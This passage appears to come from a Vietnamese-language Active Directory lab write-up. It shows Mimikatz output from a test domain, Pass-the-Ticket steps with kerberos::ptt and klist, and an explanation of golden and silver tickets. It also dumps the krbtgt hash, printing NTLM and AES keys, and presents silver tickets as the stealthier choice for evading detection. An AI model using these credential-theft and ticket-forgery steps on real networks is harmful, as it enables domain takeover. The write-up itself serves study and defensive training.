           Service Name (02) : ldap ; CONTROLLER-1.CONTROLLER.local ; @ CONTROLLER.LOCAL
           Target Name  (--) : @ CONTROLLER.LOCAL
           Client Name  (01) : CONTROLLER-1$ ; @ CONTROLLER.LOCAL
           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             0076fa32c13f08d1bdeded5a810bf509fcdde75f529ad19400cc8ca68cd5053d
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 5        [...]
           * Saved to file [0;2e8f4]-1-0-40a50000-CONTROLLER-1$@ldap-CONTROLLER-1.CONTROLLER.local.kirbi !

        Group 2 - Ticket Granting Ticket

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 6/25/2026 2:57:12 AM
SID               : S-1-5-19

         * Username : (null)
         * Domain   : (null)
         * Password : (null)

        Group 0 - Ticket Granting Service

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket

Authentication Id : 0 ; 60857 (00000000:0000edb9)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 6/25/2026 2:57:11 AM
SID               : S-1-5-90-0-1

         * Username : CONTROLLER-1$
         * Domain   : CONTROLLER.local
         * Password : fe 09 4c 08 0b cb e9 93 22 f0 ac d0 03 6d 7a be dd 10 c4 32 a0 f9 14 72 e7 25 44 a7 23 39 a4 68 3b 82 9e 60 ef d4 d3 5a 8a 21 90 fe 71 14 bb 16 cf 47 f
1 d7 9b 3d e5 e3 da cf 67 7e 9b 36 32 75 87 57 1b fc 8e e9 4e f6 30 3d 88 24 6e 4f 15 b9 f8 26 d3 d0 83 c0 67 1c b4 59 2e d6 bd 13 07 60 5e 07 e7 ea 6e cd 77 da 97 f6 69 ea 
4c 6e 75 e7 25 04 a5 d2 1d 6e 8b d2 90 4e a1 1d 63 1d 02 22 42 a9 07 0b 1b bb f1 dc 6e 14 ed ab fa e4 3b 90 41 0b 87 bb a2 4d 27 77 7a b0 b2 22 c8 de 48 64 fd 21 2e da df 68
 cc e0 3a 04 67 8a 11 a2 f8 f4 b0 b0 d1 e3 51 04 f1 fe da c9 f6 85 eb f4 25 a3 52 2a 00 e8 25 d3 9a 08 31 27 86 cd b3 fe 6e 40 f6 ed 59 03 fe b1 3a 98 bf f7 d5 6c 74 3e de 5
d fb 15 f4 08 c9 2b fd 0f c7 e7 6a 79 38 2c 93 4b

        Group 0 - Ticket Granting Service

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket

Authentication Id : 0 ; 33350 (00000000:00008246)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 6/25/2026 2:57:08 AM
SID               : S-1-5-96-0-0

         * Username : CONTROLLER-1$
         * Domain   : CONTROLLER.local
         * Password : fe 09 4c 08 0b cb e9 93 22 f0 ac d0 03 6d 7a be dd 10 c4 32 a0 f9 14 72 e7 25 44 a7 23 39 a4 68 3b 82 9e 60 ef d4 d3 5a 8a 21 90 fe 71 14 bb 16 cf 47 f
1 d7 9b 3d e5 e3 da cf 67 7e 9b 36 32 75 87 57 1b fc 8e e9 4e f6 30 3d 88 24 6e 4f 15 b9 f8 26 d3 d0 83 c0 67 1c b4 59 2e d6 bd 13 07 60 5e 07 e7 ea 6e cd 77 da 97 f6 69 ea 
4c 6e 75 e7 25 04 a5 d2 1d 6e 8b d2 90 4e a1 1d 63 1d 02 22 42 a9 07 0b 1b bb f1 dc 6e 14 ed ab fa e4 3b 90 41 0b 87 bb a2 4d 27 77 7a b0 b2 22 c8 de 48 64 fd 21 2e da df 68
 cc e0 3a 04 67 8a 11 a2 f8 f4 b0 b0 d1 e3 51 04 f1 fe da c9 f6 85 eb f4 25 a3 52 2a 00 e8 25 d3 9a 08 31 27 86 cd b3 fe 6e 40 f6 ed 59 03 fe b1 3a 98 bf f7 d5 6c 74 3e de 5
d fb 15 f4 08 c9 2b fd 0f c7 e7 6a 79 38 2c 93 4b

        Group 0 - Ticket Granting Service

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : CONTROLLER-1$
Domain            : CONTROLLER
Logon Server      : (null)
Logon Time        : 6/25/2026 2:56:57 AM
SID               : S-1-5-18

         * Username : controller-1$
         * Domain   : CONTROLLER.LOCAL
         * Password : (null)

        Group 0 - Ticket Granting Service
         [00000000]
           Start/End/MaxRenew: 6/25/2026 3:28:37 AM ; 6/25/2026 12:57:48 PM ; 7/2/2026 2:57:48 AM
           Service Name (02) : HTTP ; CONTROLLER-1.CONTROLLER.local ; @ CONTROLLER.LOCAL
           Target Name  (02) : HTTP ; CONTROLLER-1.CONTROLLER.local ; @ CONTROLLER.LOCAL
           Client Name  (01) : CONTROLLER-1$ ; @ CONTROLLER.LOCAL
           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             3569f4931ba40d1f778de10946c10efb57bfc2ef0ff76beda37584ae51934b62
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 5        [...]
           * Saved to file [0;3e7]-0-0-40a50000-CONTROLLER-1$@HTTP-CONTROLLER-1.CONTROLLER.local.kirbi !
         [00000001]
           Start/End/MaxRenew: 6/25/2026 3:12:19 AM ; 6/25/2026 12:57:48 PM ; 7/2/2026 2:57:48 AM
           Service Name (02) : GC ; CONTROLLER-1.CONTROLLER.local ; CONTROLLER.local ; @ CONTROLLER.LOCAL
           Target Name  (02) : GC ; CONTROLLER-1.CONTROLLER.local ; CONTROLLER.local ; @ CONTROLLER.LOCAL
           Client Name  (01) : CONTROLLER-1$ ; @ CONTROLLER.LOCAL ( CONTROLLER.local )
           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             57e5ae6118dacd4db0f402e66f2b56605549aefb8832546078b3111a6d7737ef
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 5        [...]
           * Saved to file [0;3e7]-0-1-40a50000-CONTROLLER-1$@GC-CONTROLLER-1.CONTROLLER.local.kirbi !
         [00000002]
           Start/End/MaxRenew: 6/25/2026 3:07:00 AM ; 6/25/2026 12:57:48 PM ; 7/2/2026 2:57:48 AM
           Service Name (02) : cifs ; CONTROLLER-1 ; @ CONTROLLER.LOCAL
           Target Name  (02) : cifs ; CONTROLLER-1 ; @ CONTROLLER.LOCAL
           Client Name  (01) : CONTROLLER-1$ ; @ CONTROLLER.LOCAL
           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             77462aa902b6f80e359574d286b9e2909ea14d10d18777a8f2ce87f0abcf8283
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 5        [...]
           * Saved to file [0;3e7]-0-2-40a50000-CONTROLLER-1$@cifs-CONTROLLER-1.kirbi !
         [00000003]
           Start/End/MaxRenew: 6/25/2026 2:58:16 AM ; 6/25/2026 12:57:48 PM ; 7/2/2026 2:57:48 AM
           Service Name (01) : CONTROLLER-1$ ; @ CONTROLLER.LOCAL
           Target Name  (01) : CONTROLLER-1$ ; @ CONTROLLER.LOCAL
           Client Name  (01) : CONTROLLER-1$ ; @ CONTROLLER.LOCAL
           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             e730b3ef302bc59f31baa722b6fa8d7ee9ca1e6970e76d1aefd283d4c5fed232
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 5        [...]
           * Saved to file [0;3e7]-0-3-40a50000.kirbi !
         [00000004]
           Start/End/MaxRenew: 6/25/2026 2:58:16 AM ; 6/25/2026 12:57:48 PM ; 7/2/2026 2:57:48 AM
           Service Name (02) : cifs ; CONTROLLER-1.CONTROLLER.local ; CONTROLLER.local ; @ CONTROLLER.LOCAL
           Target Name  (02) : cifs ; CONTROLLER-1.CONTROLLER.local ; CONTROLLER.local ; @ CONTROLLER.LOCAL
           Client Name  (01) : CONTROLLER-1$ ; @ CONTROLLER.LOCAL ( CONTROLLER.local )
           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             699133ba6f5f3caed9de0321758880af2894e9058ca3acc4667d69de6fc6dfa5
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 5        [...]
           * Saved to file [0;3e7]-0-4-40a50000-CONTROLLER-1$@cifs-CONTROLLER-1.CONTROLLER.local.kirbi !
         [00000005]
           Start/End/MaxRenew: 6/25/2026 2:57:56 AM ; 6/25/2026 12:57:48 PM ; 7/2/2026 2:57:48 AM
           Service Name (02) : LDAP ; CONTROLLER-1.CONTROLLER.local ; CONTROLLER.local ; @ CONTROLLER.LOCAL
           Target Name  (02) : LDAP ; CONTROLLER-1.CONTROLLER.local ; CONTROLLER.local ; @ CONTROLLER.LOCAL
           Client Name  (01) : CONTROLLER-1$ ; @ CONTROLLER.LOCAL ( CONTROLLER.LOCAL )
           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             8d64c0200906ad7d36918d2f90a1c1384228511127cc787c954286d79168cd6a
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 5        [...]
           * Saved to file [0;3e7]-0-5-40a50000-CONTROLLER-1$@LDAP-CONTROLLER-1.CONTROLLER.local.kirbi !
         [00000006]
           Start/End/MaxRenew: 6/25/2026 2:57:48 AM ; 6/25/2026 12:57:48 PM ; 7/2/2026 2:57:48 AM
           Service Name (02) : ldap ; CONTROLLER-1.CONTROLLER.local ; @ CONTROLLER.LOCAL
           Target Name  (02) : ldap ; CONTROLLER-1.CONTROLLER.local ; @ CONTROLLER.LOCAL
           Client Name  (01) : CONTROLLER-1$ ; @ CONTROLLER.LOCAL
           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             0076fa32c13f08d1bdeded5a810bf509fcdde75f529ad19400cc8ca68cd5053d
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 5        [...]
           * Saved to file [0;3e7]-0-6-40a50000-CONTROLLER-1$@ldap-CONTROLLER-1.CONTROLLER.local.kirbi !
         [00000007]
           Start/End/MaxRenew: 6/25/2026 2:57:48 AM ; 6/25/2026 12:57:48 PM ; 7/2/2026 2:57:48 AM
           Service Name (02) : LDAP ; CONTROLLER-1 ; @ CONTROLLER.LOCAL
           Target Name  (02) : LDAP ; CONTROLLER-1 ; @ CONTROLLER.LOCAL
           Client Name  (01) : CONTROLLER-1$ ; @ CONTROLLER.LOCAL
           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             cbf5f22aab1ee8beebeda59a6b6e0140b12d5baf08e38756e6d14186a1515d1d
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 5        [...]
           * Saved to file [0;3e7]-0-7-40a50000-CONTROLLER-1$@LDAP-CONTROLLER-1.kirbi !

        Group 1 - Client Ticket ?
         [00000000]
           Start/End/MaxRenew: 6/25/2026 3:25:46 AM ; 6/25/2026 3:40:46 AM ; 7/2/2026 2:57:48 AM
           Service Name (01) : controller-1$ ; @ (null)
           Target Name  (10) : administrator@CONTROLLER.local ; @ (null)
           Client Name  (10) : administrator@CONTROLLER.local ; @ CONTROLLER.LOCAL
           Flags 00a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ;
           Session Key       : 0x00000012 - aes256_hmac
             3f9f91d12fe5acc8fd356b8b76dcdc144f04ac7f31ac02a187bef6434dc3333e
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 5        [...]
           * Saved to file [0;3e7]-1-0-00a50000.kirbi !

        Group 2 - Ticket Granting Ticket
         [00000000]
           Start/End/MaxRenew: 6/25/2026 2:57:48 AM ; 6/25/2026 12:57:48 PM ; 7/2/2026 2:57:48 AM
           Service Name (02) : krbtgt ; CONTROLLER.LOCAL ; @ CONTROLLER.LOCAL
           Target Name  (--) : @ CONTROLLER.LOCAL
           Client Name  (01) : CONTROLLER-1$ ; @ CONTROLLER.LOCAL ( $$Delegation Ticket$$ )
           Flags 60a10000    : name_canonicalize ; pre_authent ; renewable ; forwarded ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             9a65d95f3c53ded303b29e9680b1bfd9473783ce58c3f32713460bcdff9eac82
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...]
           * Saved to file [0;3e7]-2-0-60a10000-CONTROLLER-1$@krbtgt-CONTROLLER.LOCAL.kirbi !
         [00000001]
           Start/End/MaxRenew: 6/25/2026 2:57:48 AM ; 6/25/2026 12:57:48 PM ; 7/2/2026 2:57:48 AM
           Service Name (02) : krbtgt ; CONTROLLER.LOCAL ; @ CONTROLLER.LOCAL
           Target Name  (02) : krbtgt ; CONTROLLER.LOCAL ; @ CONTROLLER.LOCAL
           Client Name  (01) : CONTROLLER-1$ ; @ CONTROLLER.LOCAL ( CONTROLLER.LOCAL )
           Flags 40e10000    : name_canonicalize ; pre_authent ; initial ; renewable ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             33a7b01ea2a8ffe4d22afd8de296925c0b3bf48d4525a1f04c64527880024716
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...]
           * Saved to file [0;3e7]-2-1-40e10000-CONTROLLER-1$@krbtgt-CONTROLLER.LOCAL.kirbi !

```



### Pass the Ticket w/ Mimikatz&#xD;

Bây giờ khi đã chuẩn bị xong ticket, chúng ta có thể thực hiện **Pass-the-Ticket (PTT)** để đạt được quyền **Domain Admin**.

1.) `kerberos::ptt <ticket>` – chạy lệnh này bên trong Mimikatz với file ticket mà bạn đã thu thập được trước đó. Lệnh sẽ nạp (cache/inject) ticket đó vào phiên Kerberos hiện tại và mạo danh (impersonate) tài khoản sở hữu ticket đó.

```bash
controller\administrator@CONTROLLER-1 C:\Users\Administrator\Downloads>dir *.kirbi
 Volume in drive C has no label.
 Volume Serial Number is E203-08FF

 Directory of C:\Users\Administrator\Downloads

06/25/2026  04:30 AM             1,787 [0;1954e6]-1-0-40a50000-CONTROLLER-1$@GC-CONTROLLER-1.CONTROLLER.local.kirbi
06/25/2026  04:30 AM             1,595 [0;1fade5]-2-0-40e10000-Administrator@krbtgt-CONTROLLER.LOCAL.kirbi
06/25/2026  04:30 AM             1,587 [0;28c359]-2-0-60a10000-CONTROLLER-1$@krbtgt-CONTROLLER.LOCAL.kirbi
06/25/2026  04:30 AM             1,755 [0;2e8f4]-1-0-40a50000-CONTROLLER-1$@ldap-CONTROLLER-1.CONTROLLER.local.kirbi
06/25/2026  04:30 AM             1,587 [0;2ebc5]-2-0-60a10000-CONTROLLER-1$@krbtgt-CONTROLLER.LOCAL.kirbi
06/25/2026  04:30 AM             1,791 [0;3e4]-0-0-40a50000-CONTROLLER-1$@ldap-CONTROLLER-1.CONTROLLER.local.kirbi
06/25/2026  04:30 AM             1,587 [0;3e4]-2-0-40e10000-CONTROLLER-1$@krbtgt-CONTROLLER.LOCAL.kirbi
06/25/2026  04:30 AM             1,755 [0;3e7]-0-0-40a50000-CONTROLLER-1$@HTTP-CONTROLLER-1.CONTROLLER.local.kirbi
06/25/2026  04:30 AM             1,787 [0;3e7]-0-1-40a50000-CONTROLLER-1$@GC-CONTROLLER-1.CONTROLLER.local.kirbi
06/25/2026  04:30 AM             1,721 [0;3e7]-0-2-40a50000-CONTROLLER-1$@cifs-CONTROLLER-1.kirbi
06/25/2026  04:30 AM             1,711 [0;3e7]-0-3-40a50000.kirbi
06/25/2026  04:30 AM             1,791 [0;3e7]-0-4-40a50000-CONTROLLER-1$@cifs-CONTROLLER-1.CONTROLLER.local.kirbi
06/25/2026  04:30 AM             1,791 [0;3e7]-0-5-40a50000-CONTROLLER-1$@LDAP-CONTROLLER-1.CONTROLLER.local.kirbi
06/25/2026  04:30 AM             1,755 [0;3e7]-0-6-40a50000-CONTROLLER-1$@ldap-CONTROLLER-1.CONTROLLER.local.kirbi
06/25/2026  04:30 AM             1,721 [0;3e7]-0-7-40a50000-CONTROLLER-1$@LDAP-CONTROLLER-1.kirbi
06/25/2026  04:30 AM             1,647 [0;3e7]-1-0-00a50000.kirbi
06/25/2026  04:30 AM             1,587 [0;3e7]-2-0-60a10000-CONTROLLER-1$@krbtgt-CONTROLLER.LOCAL.kirbi
06/25/2026  04:30 AM             1,587 [0;3e7]-2-1-40e10000-CONTROLLER-1$@krbtgt-CONTROLLER.LOCAL.kirbi
06/25/2026  04:30 AM             1,755 [0;64dac]-1-0-40a50000-CONTROLLER-1$@ldap-CONTROLLER-1.CONTROLLER.local.kirbi
06/25/2026  04:30 AM             1,755 [0;64e08]-1-0-40a50000-CONTROLLER-1$@ldap-CONTROLLER-1.CONTROLLER.local.kirbi
06/25/2026  04:30 AM             1,791 [0;64e44]-1-0-40a50000-CONTROLLER-1$@LDAP-CONTROLLER-1.CONTROLLER.local.kirbi
06/25/2026  04:30 AM             1,755 [0;64e7d]-1-0-40a50000-CONTROLLER-1$@ldap-CONTROLLER-1.CONTROLLER.local.kirbi
              22 File(s)         37,598 bytes
               0 Dir(s)  50,889,224,192 bytes free

controller\administrator@CONTROLLER-1 C:\Users\Administrator\Downloads>mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 May 19 2020 00:48:59
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz # kerberos::ptt [0;1fade5]-2-0-40e10000-Administrator@krbtgt-CONTROLLER.LOCAL.kirbi 

* File: '[0;1fade5]-2-0-40e10000-Administrator@krbtgt-CONTROLLER.LOCAL.kirbi': OK

```

**2.) `klist`** – Ở đây chúng ta chỉ đang xác minh rằng việc mạo danh (impersonate) ticket đã thành công bằng cách liệt kê các Kerberos ticket hiện đang được lưu trong cache.

Chúng ta sẽ không sử dụng **Mimikatz** nữa trong phần còn lại của cuộc tấn công.

```bash
controller\administrator@CONTROLLER-1 C:\Users\Administrator\Downloads>klist

Current LogonId is 0:0x1fade5

Cached Tickets: (1)

#0>     Client: Administrator @ CONTROLLER.LOCAL
        Server: krbtgt/CONTROLLER.LOCAL @ CONTROLLER.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
        Start Time: 6/25/2026 3:25:53 (local)
        End Time:   6/25/2026 13:25:53 (local)
        Renew Time: 7/2/2026 3:25:53 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called:

controller\administrator@CONTROLLER-1 C:\Users\Administrator\Downloads>
```

3.) Bây giờ bạn đã mạo danh (impersonate) ticket này, điều đó cho bạn các quyền tương đương với TGT mà bạn đang mạo danh. Để xác minh điều này, chúng ta có thể kiểm tra admin share.

<figure><img src="../.gitbook/assets/image (982).png" alt=""><figcaption></figcaption></figure>



Golden/Silver Ticket Attacks w/ mimikatz\



Mimikatz là một công cụ post-exploitation rất phổ biến và mạnh mẽ, thường được sử dụng để dump user credentials trong một mạng Active Directory đang hoạt động. Tuy nhiên, ở đây chúng ta sẽ sử dụng Mimikatz để tạo một silver ticket.

Trong một số trường hợp, silver ticket có thể phù hợp hơn golden ticket trong các engagement vì nó kín đáo hơn một chút. Nếu yếu tố stealth và tránh bị phát hiện là quan trọng thì silver ticket thường là lựa chọn tốt hơn golden ticket. Tuy nhiên, quy trình tạo chúng về cơ bản là giống hệt nhau. Điểm khác biệt chính giữa hai loại ticket là silver ticket chỉ giới hạn ở service được nhắm mục tiêu, trong khi golden ticket có thể truy cập bất kỳ Kerberos service nào.

Một tình huống sử dụng cụ thể của silver ticket là khi bạn muốn truy cập SQL server của domain nhưng user account mà bạn đã compromise hiện tại không có quyền truy cập vào server đó. Bạn có thể tìm một service account khả dụng bằng cách thực hiện Kerberoasting đối với service đó, sau đó dump service hash và impersonate TGT của service account đó để yêu cầu một service ticket cho SQL service từ KDC, từ đó cho phép bạn truy cập SQL server của domain.

### KRBTGT Overview &#xD; &#xD;

Để hiểu đầy đủ cách các cuộc tấn công này hoạt động, bạn cần hiểu sự khác biệt giữa KRBTGT và TGT. KRBTGT là service account của KDC. KDC là Key Distribution Center, thành phần chịu trách nhiệm cấp phát tất cả các ticket cho client. Nếu bạn impersonate account này và tạo một golden ticket từ KRBTGT, bạn sẽ có khả năng tạo service ticket cho bất kỳ service nào mà bạn muốn.

TGT là ticket được KDC cấp cho một service account và chỉ có thể được sử dụng để truy cập service tương ứng với ticket đó, ví dụ như SQLService ticket.

### Golden/Silver Ticket Attack Overview -&#x20;

<figure><img src="../.gitbook/assets/image (984).png" alt=""><figcaption></figcaption></figure>

Golden ticket attack hoạt động bằng cách dump ticket-granting ticket của một user trong domain, lý tưởng nhất là Domain Admin. Đối với golden ticket, bạn sẽ dump KRBTGT ticket; còn đối với silver ticket, bạn sẽ dump ticket của một service account hoặc Domain Admin account.

Quá trình này sẽ cung cấp SID của service account hoặc Domain Admin account, tức Security Identifier — định danh duy nhất của mỗi user account — cùng với NTLM hash của account đó.

Sau đó, bạn sử dụng các thông tin này trong kỹ thuật Golden Ticket của Mimikatz để tạo một TGT giả mạo, mang danh tính của service account tương ứng bằng cách sử dụng các thông tin đã thu thập được.

### Dump the krbtgt hash -&#xD; &#xD;

lsadump::lsa /inject /name:krbtgt - Lệnh này sẽ dump hash cũng như Security Identifier cần thiết để tạo Golden Ticket.

Để tạo Silver Ticket, bạn cần thay đổi giá trị của tham số /name: để dump hash của một Domain Admin account hoặc một service account, chẳng hạn như account SQLService.

```bash
controller\administrator@CONTROLLER-1 C:\Users\Administrator\Downloads>mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 May 19 2020 00:48:59
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz # lsadump::lsa /inject /name:krbtgt 
Domain : CONTROLLER / S-1-5-21-432953485-3795405108-1502158860 

RID  : 000001f6 (502)
User : krbtgt

 * Primary
    NTLM : 72cd714611b64cd4d5550cd2759db3f6
    LM   :
  Hash NTLM: 72cd714611b64cd4d5550cd2759db3f6
    ntlm- 0: 72cd714611b64cd4d5550cd2759db3f6
    lm  - 0: aec7e106ddd23b3928f7b530f60df4b6

 * WDigest
    01  d2e9aa3caa4509c3f11521c70539e4ad
    02  c9a868fc195308b03d72daa4a5a4ee47
    03  171e066e448391c934d0681986f09ff4
    04  d2e9aa3caa4509c3f11521c70539e4ad
    05  c9a868fc195308b03d72daa4a5a4ee47
    06  41903264777c4392345816b7ecbf0885
    07  d2e9aa3caa4509c3f11521c70539e4ad
    08  9a01474aa116953e6db452bb5cd7dc49 
    09  a8e9a6a41c9a6bf658094206b51a4ead
    10  8720ff9de506f647ad30f6967b8fe61e
    11  841061e45fdc428e3f10f69ec46a9c6d
    12  a8e9a6a41c9a6bf658094206b51a4ead
    13  89d0db1c4f5d63ef4bacca5369f79a55
    14  841061e45fdc428e3f10f69ec46a9c6d
    15  a02ffdef87fc2a3969554c3f5465042a
    16  4ce3ef8eb619a101919eee6cc0f22060
    17  a7c3387ac2f0d6c6a37ee34aecf8e47e
    18  085f371533fc3860fdbf0c44148ae730
    19  265525114c2c3581340ddb00e018683b 
    20  f5708f35889eee51a5fa0fb4ef337a9b
    21  bffaf3c4eba18fd4c845965b64fca8e2
    22  bffaf3c4eba18fd4c845965b64fca8e2
    23  3c10f0ae74f162c4b81bf2a463a344aa
    24  96141c5119871bfb2a29c7ea7f0facef
    25  f9e06fa832311bd00a07323980819074
    26  99d1dd6629056af22d1aea639398825b
    27  919f61b2c84eb1ff8d49ddc7871ab9e0
    28  d5c266414ac9496e0e66ddcac2cbcc3b
    29  aae5e850f950ef83a371abda478e05db

 * Kerberos
    Default Salt : CONTROLLER.LOCALkrbtgt
    Credentials 
      des_cbc_md5       : 79bf07137a8a6b8f

 * Kerberos-Newer-Keys
    Default Salt : CONTROLLER.LOCALkrbtgt
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : dfb518984a8965ca7504d6d5fb1cbab56d444c58ddff6c193b64fe6b6acf1033
      aes128_hmac       (4096) : 88cc87377b02a885b84fe7050f336d9b
      des_cbc_md5       (4096) : 79bf07137a8a6b8f

 * NTLM-Strong-NTOWF
    Random Value : 4b9102d709aada4d56a27b6c3cd14223
```



### Create a Golden/Silver Ticket - &#xD;













